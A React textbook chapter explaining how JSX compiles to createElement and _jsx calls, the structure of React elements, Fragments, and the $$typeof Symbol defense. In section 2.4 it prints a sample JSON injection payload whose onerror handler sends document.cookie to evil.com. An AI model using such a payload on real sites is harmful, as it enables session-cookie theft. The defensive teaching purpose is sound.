# Part 2, Chapter 2: JSX - It's Just JavaScript

## What You Will Learn

- Trace exactly how JSX compiles into `_jsx()` / `React.createElement()` calls and identify the differences between the classic and automatic transforms
- Describe the structure of a React element object and explain the role of each field: `type`, `props`, `key`, `ref`, and `$$typeof`
- Explain how the `$$typeof` Symbol prevents JSON injection XSS attacks
- Apply JSX expression rules, conditional rendering patterns, and Fragment syntax correctly
- Articulate why JSX requires a single root element as a consequence of JavaScript expression semantics
- Build a complete React component using only `React.createElement` calls, without any JSX

---

## 2.1 JSX is Syntactic Sugar for `React.createElement()`

JSX is not a template language. It is not HTML embedded in JavaScript. JSX is a syntactic extension to JavaScript that compiles into function calls. Every JSX expression is transformed by a compiler (Babel, TypeScript, SWC, or esbuild) into a JavaScript function call that produces a plain object.

Consider a simple component:

```javascript
function Greeting({ name }) {
  return <h1 className="title">Hello, {name}</h1>;
}
```

This JSX is not interpreted by the JavaScript engine. Before the code reaches the browser, a compiler transforms it into:

```javascript
// Classic transform (pre-React 17)
function Greeting({ name }) {
  return React.createElement("h1", { className: "title" }, "Hello, ", name);
}
```

The `React.createElement` function accepts three categories of arguments:

1. **`type`**: A string for HTML elements (`"h1"`, `"div"`, `"span"`) or a reference to a component (a function or class).
2. **`props`**: An object containing the element's properties, or `null` if there are none.
3. **`children`**: Zero or more additional arguments representing child elements. These are passed as variadic trailing arguments.

The return value is a **React element**: a plain JavaScript object that describes what should appear on screen. It is not a DOM node. It is a lightweight description that React uses during reconciliation.

> **See Also:** Part 2, Chapter 1, Section 1.4 for the `UI = f(state)` model that React elements serve.

### Nested Elements

When JSX contains nested elements, the compilation produces nested function calls:

```javascript
// JSX
function Card({ title, children }) {
  return (
    <div className="card">
      <h2 className="card-title">{title}</h2>
      <div className="card-body">{children}</div>
    </div>
  );
}

// Compiled (classic transform)
function Card({ title, children }) {
  return React.createElement(
    "div",
    { className: "card" },
    React.createElement("h2", { className: "card-title" }, title),
    React.createElement("div", { className: "card-body" }, children)
  );
}
```

Each JSX element becomes a `createElement` call. The outer call receives the inner calls as children arguments. The result is a tree of plain objects, which is exactly what the virtual DOM is.

### Component Elements vs Host Elements

JSX treats lowercase tags as HTML (host) elements and uppercase tags as component references:

```javascript
// Lowercase: treated as a string type
<div className="wrapper" />
// Compiles to: React.createElement("div", { className: "wrapper" })

// Uppercase: treated as a component reference
<UserProfile name="Alice" />
// Compiles to: React.createElement(UserProfile, { name: "Alice" })
```

This is why React components must start with an uppercase letter. If `userProfile` were lowercase, the compiler would emit `"userProfile"` as a string, and React would attempt to create an HTML element called `<userprofile>`, which is not a valid HTML tag.

> **Common Mistake:** Developers sometimes create components with lowercase names (often when dynamically selecting components). The JSX compiler treats lowercase names as strings, not as variable references. If you need to render a dynamic component, assign it to a capitalized variable first:
> ```javascript
> // Wrong: compiler treats "component" as an HTML tag string
> const component = isAdmin ? AdminPanel : UserPanel;
> return <component />; // Renders <component>, not the actual component
>
> // Correct: capitalize the variable
> const Component = isAdmin ? AdminPanel : UserPanel;
> return <Component />; // Renders AdminPanel or UserPanel
> ```

---

## 2.2 How Babel Transforms JSX (The Compilation Step)

### The Classic Transform

Before React 17, all JSX was compiled using the **classic** transform. This required `React` to be in scope in every file that used JSX, because the compiled output called `React.createElement` directly:

```javascript
// Source
import React from "react";

function App() {
  return <div>Hello</div>;
}

// Compiled output
import React from "react";

function App() {
  return React.createElement("div", null, "Hello");
}
```

The `import React` line was mandatory even though the developer never explicitly used `React` in the source. Removing it would cause a runtime error: `React is not defined`.

### The Automatic Transform (React 17+)

React 17 introduced a new **automatic** JSX transform that changes how JSX is compiled. Instead of calling `React.createElement`, the compiler imports specialized functions from `react/jsx-runtime`:

```javascript
// Source (no React import needed!)
function App() {
  return <div>Hello</div>;
}

// Compiled output (automatic transform)
import { jsx as _jsx } from "react/jsx-runtime";

function App() {
  return _jsx("div", { children: "Hello" });
}
```

The compiler automatically injects the import statement. Developers no longer need to import React in files that only use JSX.

### `_jsx` vs `_jsxs`: The Static Children Optimization

The automatic transform uses two different functions depending on the number of children:

```javascript
// One child: uses _jsx
<div><span>Only child</span></div>

// Compiles to:
_jsx("div", {
  children: _jsx("span", { children: "Only child" })
});

// Multiple static children: uses _jsxs
<div>
  <h1>Title</h1>
  <p>Content</p>
</div>

// Compiles to:
_jsxs("div", {
  children: [
    _jsx("h1", { children: "Title" }),
    _jsx("p", { children: "Content" })
  ]
});
```

The `_jsxs` function signals to React that the children array is static (known at compile time and will not change between renders). This allows React to skip certain reconciliation checks on these children, providing a small performance optimization.

### Key Differences Between Classic and Automatic Transforms

| Aspect | Classic (`createElement`) | Automatic (`_jsx` / `_jsxs`) |
|--------|--------------------------|-------------------------------|
| Import required | `import React from "react"` | Auto-injected by compiler |
| Children passing | Variadic trailing arguments | `children` property in props object |
| Key handling | Part of the props argument | Extracted as a separate third argument |
| Multiple children | All passed as individual arguments | Wrapped in an array via `_jsxs` |
| Development mode | Same function | Uses `jsxDEV` from `react/jsx-dev-runtime` |

### Configuring the Transform

**Babel configuration (`@babel/preset-react`):**

```javascript
// babel.config.js
module.exports = {
  presets: [
    ["@babel/preset-react", {
      runtime: "automatic",    // "classic" or "automatic"
      importSource: "react",   // can be changed for Preact, etc.
    }]
  ]
};
```

**TypeScript configuration (`tsconfig.json`):**

```javascript
{
  "compilerOptions": {
    "jsx": "react-jsx"       // automatic transform
    // "jsx": "react"        // classic transform
  }
}
```

Modern tooling (Vite, Next.js, Create React App 4+) defaults to the automatic transform.

---

## 2.3 The React Element Object

When `_jsx()` or `React.createElement()` executes, it returns a React element: a plain JavaScript object. There is nothing magical about this object. It is an immutable description of what should appear on screen.

```javascript
// This JSX:
const element = <h1 className="greeting" id="main">Hello, world</h1>;

// Produces this object:
{
  $$typeof: Symbol.for("react.element"),
  type: "h1",
  key: null,
  ref: null,
  props: {
    className: "greeting",
    id: "main",
    children: "Hello, world"
  },
  _owner: null
}
```

### Field-by-Field Breakdown

**`$$typeof`**: A Symbol that identifies this object as a legitimate React element. This field exists for security purposes (covered in Section 2.4). Its value is `Symbol.for("react.element")`.

**`type`**: Determines what kind of element this represents.

- For HTML elements: a string (`"div"`, `"span"`, `"h1"`)
- For function components: the function reference itself
- For class components: the class constructor reference
- For fragments: `Symbol.for("react.fragment")`

```javascript
// String type (host element)
<div /> → { type: "div", ... }

// Function type (component)
<Greeting /> → { type: Greeting, ... }  // Greeting is the function reference

// Fragment type
<></> → { type: Symbol.for("react.fragment"), ... }
```

**`key`**: A string used by React's reconciliation algorithm to match elements across renders. When not specified, it is `null`. Keys are extracted from props during element creation and placed at the top level.

> **See Also:** Part 2, Chapter 3, Section 3.7 for the full explanation of how keys drive the diffing algorithm.

**`ref`**: A mechanism for obtaining a reference to the underlying DOM node or component instance. In React 18 and earlier, `ref` was a separate top-level field. In React 19, `ref` has been moved into `props` alongside other properties, and `forwardRef` is no longer necessary for function components.

**`props`**: An object containing all properties passed to the element, including `children`. The `children` prop can be a string, a number, a single React element, an array of elements, or `null`/`undefined`.

```javascript
// Children as string
<p>Hello</p>
// props: { children: "Hello" }

// Children as single element
<div><span>Child</span></div>
// props: { children: { type: "span", props: { children: "Child" }, ... } }

// Children as array
<ul><li>A</li><li>B</li></ul>
// props: { children: [
//   { type: "li", props: { children: "A" }, ... },
//   { type: "li", props: { children: "B" }, ... }
// ] }
```

**`_owner`**: An internal field used by React in development mode to track which component created this element. This powers the warning messages that identify the responsible component when something goes wrong (e.g., "Check the render method of ParentComponent").

### React Elements Are Immutable

Once created, a React element cannot be modified. Its props, type, and children are frozen. To update the UI, you create new elements (by re-rendering the component), and React compares the new elements to the old ones to determine the minimal set of DOM changes.

```javascript
// You cannot do this:
const element = <h1>Hello</h1>;
element.props.children = "Goodbye"; // This violates React's contract

// Instead, create a new element:
const updatedElement = <h1>Goodbye</h1>;
```

This immutability is central to React's rendering model. Elements are cheap to create (they are small plain objects), and React's reconciliation algorithm depends on being able to compare old elements to new elements without worrying about mutations.

> **See Also:** Part 1, Chapter 7, Section 7.6 for why mutation breaks React rendering and the immutability contract.

---

## 2.4 `$$typeof` and XSS Protection

The `$$typeof` field on React elements serves a specific security purpose: it prevents **JSON injection attacks** where an attacker tricks React into rendering a malicious element.

### The Attack Vector

Consider a server endpoint that stores user-provided JSON and later passes it to a React component as data. If the server has a vulnerability that allows arbitrary JSON storage (e.g., a misconfigured API, a NoSQL injection, or a compromised database), an attacker could store a payload shaped like a React element:

```javascript
// Malicious JSON payload stored on the server
{
  "type": "div",
  "props": {
    "dangerouslySetInnerHTML": {
      "__html": "<img src=x onerror='fetch(\"https://evil.com/steal?cookie=\"+document.cookie)'>"
    }
  }
}
```

If React accepted any plain object with `type` and `props` fields as a valid element, this payload would be rendered as a `<div>` with arbitrary HTML injected into the page, executing the attacker's script.

### The Defense: Symbol Tagging

React requires every element to have `$$typeof: Symbol.for("react.element")`. The key insight is that **JSON cannot represent Symbols**. The `JSON.parse()` function has no syntax for creating a Symbol. Even if an attacker controls the entire JSON payload, they cannot inject a valid `$$typeof` field.

```javascript
// Attacker's JSON (after parsing)
const malicious = JSON.parse(serverResponse);
// malicious.$$typeof is undefined (or a string if the attacker tried)

// React's check (simplified)
function isValidElement(object) {
  return (
    typeof object === "object" &&
    object !== null &&
    object.$$typeof === Symbol.for("react.element")  // Fails for JSON
  );
}
```

The Symbol cannot be forged through any JSON-based vector. This makes `$$typeof` an effective security boundary between untrusted data (from servers, databases, or user input) and React's rendering engine.

### Why `Symbol.for()` Instead of `Symbol()`

React uses `Symbol.for("react.element")` rather than `Symbol("react.element")`. The `Symbol.for` variant creates a symbol in a global registry that is shared across JavaScript realms (iframes, Web Workers). This ensures that a React element created in one iframe can be recognized as valid by React running in another iframe.

### Historical Fallback

In environments that did not support Symbol (older browsers), React fell back to the magic number `0xeac7` (which visually resembles "React"). This fallback provided no security protection because a number can appear in JSON. In modern environments (all current browsers support Symbol), this fallback is effectively unused, and React has moved toward removing it entirely.

> **Common Mistake:** Developers sometimes assume that React's JSX escaping (which prevents `<script>` tags in text content from executing) is the only XSS protection React provides. The `$$typeof` mechanism is a separate, deeper defense layer that prevents a different category of attack: injection of entire element objects through server-side data. Both protections are necessary, and neither replaces the other.

---

## 2.5 JSX Expressions, Fragments, and the Rules

### JSX Expression Rules

JSX expressions are delimited by curly braces `{}`. Inside curly braces, any valid JavaScript expression is allowed. Statements (such as `if`, `for`, `switch`) are not allowed because JSX expressions compile to function arguments, and function arguments must be expressions.

```javascript
function UserDashboard({ user, notifications }) {
  return (
    <div>
      {/* String interpolation */}
      <h1>Welcome, {user.name}</h1>

      {/* Arithmetic expressions */}
      <p>You have {notifications.length * 2} total alerts</p>

      {/* Ternary (conditional expression) */}
      <span>{user.isAdmin ? "Administrator" : "Standard User"}</span>

      {/* Logical AND for conditional rendering */}
      {notifications.length > 0 && (
        <div className="badge">{notifications.length}</div>
      )}

      {/* Function calls */}
      <p>Joined {formatDate(user.createdAt)}</p>

      {/* Array mapping */}
      <ul>
        {notifications.map((n) => (
          <li key={n.id}>{n.message}</li>
        ))}
      </ul>
    </div>
  );
}
```

### Values That JSX Renders (and Ignores)

JSX renders strings, numbers, and React elements. It silently ignores `true`, `false`, `null`, and `undefined`:

```javascript
function RenderTest() {
  return (
    <div>
      {"visible string"}     {/* Renders: "visible string" */}
      {42}                    {/* Renders: "42" */}
      {true}                  {/* Renders: nothing */}
      {false}                 {/* Renders: nothing */}
      {null}                  {/* Renders: nothing */}
      {undefined}             {/* Renders: nothing */}
    </div>
  );
}
```

This behavior enables the `&&` conditional rendering pattern: when the left side of `&&` is `false`, the entire expression evaluates to `false`, which JSX ignores.

However, this behavior has a well-known edge case with the number `0`:

```javascript
function MessageCount({ count }) {
  return (
    <div>
      {/* Bug: when count is 0, this renders "0" on screen */}
      {count && <span>{count} new messages</span>}

      {/* Fix: use an explicit boolean comparison */}
      {count > 0 && <span>{count} new messages</span>}
    </div>
  );
}
```

When `count` is `0`, the expression `0 && <span>...</span>` evaluates to `0` (not `false`). Since `0` is a number, JSX renders it as the string "0" on screen. The fix is to ensure the left side of `&&` evaluates to a boolean, not a falsy number.

> **See Also:** Part 1, Chapter 9, Section 9.5 for short-circuit evaluation patterns and the `0` rendering pitfall.

### Conditional Rendering Patterns

JSX supports several conditional rendering approaches, each appropriate for different situations:

```javascript
function StatusMessage({ status, errorMessage }) {
  // Pattern 1: Ternary (two-branch conditional)
  const header = status === "error"
    ? <h1 className="error">Something went wrong</h1>
    : <h1 className="success">All systems operational</h1>;

  // Pattern 2: Logical AND (show or hide)
  const errorDetail = errorMessage && (
    <p className="error-detail">{errorMessage}</p>
  );

  // Pattern 3: Early return (entire component conditional)
  if (status === "loading") {
    return <div className="spinner">Loading...</div>;
  }

  // Pattern 4: IIFE or extracted variable for complex logic
  const statusIcon = (() => {
    switch (status) {
      case "error": return <ErrorIcon />;
      case "warning": return <WarningIcon />;
      case "success": return <CheckIcon />;
      default: return null;
    }
  })();

  return (
    <div>
      {statusIcon}
      {header}
      {errorDetail}
    </div>
  );
}
```

### Fragments

Fragments allow a component to return multiple elements without adding an extra DOM node:

```javascript
// Without Fragment: adds an unnecessary <div> to the DOM
function UserInfo({ name, email }) {
  return (
    <div>
      <dt>Name</dt>
      <dd>{name}</dd>
      <dt>Email</dt>
      <dd>{email}</dd>
    </div>
  );
}

// With Fragment: no extra DOM node
function UserInfo({ name, email }) {
  return (
    <>
      <dt>Name</dt>
      <dd>{name}</dd>
      <dt>Email</dt>
      <dd>{email}</dd>
    </>
  );
}
```

The Fragment compiles to a React element whose `type` is `Symbol.for("react.fragment")`:

```javascript
// Compiled Fragment
import { Fragment as _Fragment, jsxs as _jsxs } from "react/jsx-runtime";

_jsxs(_Fragment, {
  children: [
    _jsx("dt", { children: "Name" }),
    _jsx("dd", { children: name }),
    _jsx("dt", { children: "Email" }),
    _jsx("dd", { children: email })
  ]
});
```

At render time, React recognizes the Fragment type and renders its children directly into the parent DOM node, producing no wrapper element.

---

## 2.6 Why JSX Needs a Single Root (and How Fragments Solve It)

The single root requirement is not an arbitrary React rule. It is a direct consequence of how JavaScript expressions work.

### The Language Constraint

JSX compiles to a function call. A function call is a single expression that returns a single value. Two adjacent JSX elements would compile to two adjacent function calls, which is not a valid expression:

```javascript
// This JSX is syntactically invalid:
function InvalidComponent() {
  return (
    <h1>Title</h1>
    <p>Content</p>
  );
}

// Because it would compile to:
function InvalidComponent() {
  return (
    _jsx("h1", { children: "Title" })
    _jsx("p", { children: "Content" })   // Syntax error: unexpected expression
  );
}
```

A `return` statement can only return one value. Two adjacent function calls are two separate expressions; they cannot be combined into a single return value without a wrapper.

### The Reconciliation Constraint

Beyond syntax, React's reconciliation algorithm requires each component to produce exactly one root node in the virtual DOM tree. The algorithm maps components to tree positions. Each component occupies one position in its parent's children list. If a component could produce multiple root nodes, the reconciler would need to track a variable number of nodes per component, fundamentally complicating the diffing algorithm.

```
Parent Component's children:
  ┌────────────┐ ┌────────────┐ ┌────────────┐
  │ Component A │ │ Component B │ │ Component C │
  └──────┬─────┘ └──────┬─────┘ └──────┬─────┘
         │              │              │
    Single root    Single root    Single root
    (1 element)    (1 element)    (1 element)
```

If Component B could return two root elements, it would occupy two positions in the parent's children list, shifting Component C's position and breaking the index-based diffing assumption.

### How Fragments Solve Both Constraints

Fragments satisfy the single-expression constraint (they compile to one `_jsx` call that returns one object) while producing no DOM node:

```javascript
function TableRow({ data }) {
  // Without Fragment: invalid JSX (multiple roots)
  // return <td>{data.name}</td><td>{data.value}</td>;

  // With Fragment: one expression, no extra DOM node
  return (
    <>
      <td>{data.name}</td>
      <td>{data.value}</td>
    </>
  );
}

// Usage in a table
function DataTable({ rows }) {
  return (
    <table>
      <tbody>
        {rows.map((row) => (
          <tr key={row.id}>
            <TableRow data={row} />
          </tr>
        ))}
      </tbody>
    </table>
  );
}
```

This is particularly important for table structures, definition lists (`<dl>/<dt>/<dd>`), and other HTML contexts where wrapper `<div>` elements would produce invalid markup.

### Keyed Fragments

The shorthand syntax `<>...</>` cannot accept props. When rendering a list of groups where each group needs a key, use the explicit `Fragment` import:

```javascript
import { Fragment } from "react";

function GlossaryList({ terms }) {
  return (
    <dl>
      {terms.map((term) => (
        <Fragment key={term.id}>
          <dt>{term.word}</dt>
          <dd>{term.definition}</dd>
        </Fragment>
      ))}
    </dl>
  );
}
```

Without the key on the Fragment, React would issue a warning about missing keys in a list, and reconciliation performance would degrade.

---

## 2.7 Exercise: Write a Component Using Only `React.createElement`, No JSX

### Problem Statement

Build a `ProductCard` component that displays a product image, name, price, availability badge, and an "Add to Cart" button. Implement the entire component using only `React.createElement` calls (classic transform style). Then compare it with the JSX equivalent to internalize the relationship between JSX and its compiled output.

### Solution: `React.createElement` Only

```javascript
import React, { useState } from "react";

function ProductCard({ product }) {
  const [inCart, setInCart] = useState(false);

  const handleAddToCart = () => {
    setInCart(true);
  };

  // Availability badge (conditional rendering without JSX)
  const badge = product.inStock
    ? React.createElement(
        "span",
        { className: "badge badge-success" },
        "In Stock"
      )
    : React.createElement(
        "span",
        { className: "badge badge-danger" },
        "Out of Stock"
      );

  // Price with optional sale formatting
  const priceElements = [];
  if (product.salePrice) {
    priceElements.push(
      React.createElement(
        "span",
        { className: "price-original", key: "original" },
        "$" + product.price.toFixed(2)
      )
    );
    priceElements.push(
      React.createElement(
        "span",
        { className: "price-sale", key: "sale" },
        "$" + product.salePrice.toFixed(2)
      )
    );
  } else {
    priceElements.push(
      React.createElement(
        "span",
        { className: "price", key: "price" },
        "$" + product.price.toFixed(2)
      )
    );
  }

  // Button
  const button = React.createElement(
    "button",
    {
      className: inCart ? "btn btn-disabled" : "btn btn-primary",
      onClick: inCart ? undefined : handleAddToCart,
      disabled: !product.inStock || inCart,
    },
    inCart ? "Added to Cart" : "Add to Cart"
  );

  // Assemble the full card
  return React.createElement(
    "div",
    { className: "product-card" },
    // Image
    React.createElement("img", {
      src: product.imageUrl,
      alt: product.name,
      className: "product-image",
    }),
    // Body
    React.createElement(
      "div",
      { className: "product-body" },
      React.createElement("h3", { className: "product-name" }, product.name),
      badge,
      React.createElement(
        "div",
        { className: "product-price" },
        ...priceElements
      ),
      button
    )
  );
}

// Usage
function App() {
  const sampleProduct = {
    name: "Wireless Headphones",
    price: 79.99,
    salePrice: 59.99,
    imageUrl: "/images/headphones.jpg",
    inStock: true,
  };

  return React.createElement(
    "main",
    { className: "store" },
    React.createElement(ProductCard, { product: sampleProduct })
  );
}
```

### Solution: JSX Equivalent

```javascript
import { useState } from "react";

function ProductCard({ product }) {
  const [inCart, setInCart] = useState(false);

  return (
    <div className="product-card">
      <img
        src={product.imageUrl}
        alt={product.name}
        className="product-image"
      />
      <div className="product-body">
        <h3 className="product-name">{product.name}</h3>

        {product.inStock ? (
          <span className="badge badge-success">In Stock</span>
        ) : (
          <span className="badge badge-danger">Out of Stock</span>
        )}

        <div className="product-price">
          {product.salePrice ? (
            <>
              <span className="price-original">
                ${product.price.toFixed(2)}
              </span>
              <span className="price-sale">
                ${product.salePrice.toFixed(2)}
              </span>
            </>
          ) : (
            <span className="price">${product.price.toFixed(2)}</span>
          )}
        </div>

        <button
          className={inCart ? "btn btn-disabled" : "btn btn-primary"}
          onClick={inCart ? undefined : () => setInCart(true)}
          disabled={!product.inStock || inCart}
        >
          {inCart ? "Added to Cart" : "Add to Cart"}
        </button>
      </div>
    </div>
  );
}

function App() {
  const sampleProduct = {
    name: "Wireless Headphones",
    price: 79.99,
    salePrice: 59.99,
    imageUrl: "/images/headphones.jpg",
    inStock: true,
  };

  return (
    <main className="store">
      <ProductCard product={sampleProduct} />
    </main>
  );
}
```

### Comparison

The `createElement` version is approximately twice as long and significantly harder to read. The nesting structure, which is immediately visible in JSX's markup-like syntax, must be reconstructed mentally from nested function calls. Conditional rendering, which JSX handles with ternaries inline, requires separate variables and explicit array construction in the `createElement` version.

This comparison demonstrates precisely why JSX exists: it provides a visual correspondence between the code and the rendered output. The underlying mechanism is identical; JSX is purely a developer experience improvement over raw `createElement` calls.

### Key Takeaway

JSX is not a separate language or templating system. It is a thin syntactic layer over `React.createElement` (or `_jsx` in the automatic transform). Every JSX expression compiles to a function call that returns a plain JavaScript object. Understanding this compilation step demystifies JSX: there is no magic, no special runtime behavior, and no hidden abstraction. The React element objects produced by JSX are the same objects produced by direct `createElement` calls. JSX simply makes those objects easier to write and read.

---

## Chapter Summary

JSX is syntactic sugar that compiles into `_jsx()` / `React.createElement()` function calls, each producing a plain JavaScript object (a React element) with fields for `type`, `props`, `key`, `ref`, and `$$typeof`. The `$$typeof` field uses a Symbol to prevent JSON injection XSS attacks, a security mechanism that exploits the fact that Symbols cannot be represented in JSON. The single-root requirement is a consequence of JavaScript expression semantics: a function call returns one value, and JSX compiles to function calls. Fragments solve this by providing a wrapper element that produces no DOM node. The automatic JSX transform (React 17+) eliminates the need to import React in every file, uses `_jsx`/`_jsxs` with children in props, and enables static children optimizations.

## Further Reading

- [Introducing the New JSX Transform (React Blog)](https://legacy.reactjs.org/blog/2020/09/22/introducing-the-new-jsx-transform.html) — official explanation of the automatic transform
- [Why Do React Elements Have a $$typeof Property? (Dan Abramov)](https://overreacted.io/why-do-react-elements-have-typeof-property/) — the definitive explanation of the XSS protection mechanism
- [createElement (React Documentation)](https://react.dev/reference/react/createElement) — official API reference
- [Fragment (React Documentation)](https://react.dev/reference/react/Fragment) — official Fragment documentation and keyed Fragment usage
- [@babel/plugin-transform-react-jsx (Babel Documentation)](https://babeljs.io/docs/babel-plugin-transform-react-jsx) — Babel's JSX transform configuration options
- [React as a UI Runtime (Dan Abramov)](https://overreacted.io/react-as-a-ui-runtime/) — covers host trees, elements, and rendering concepts
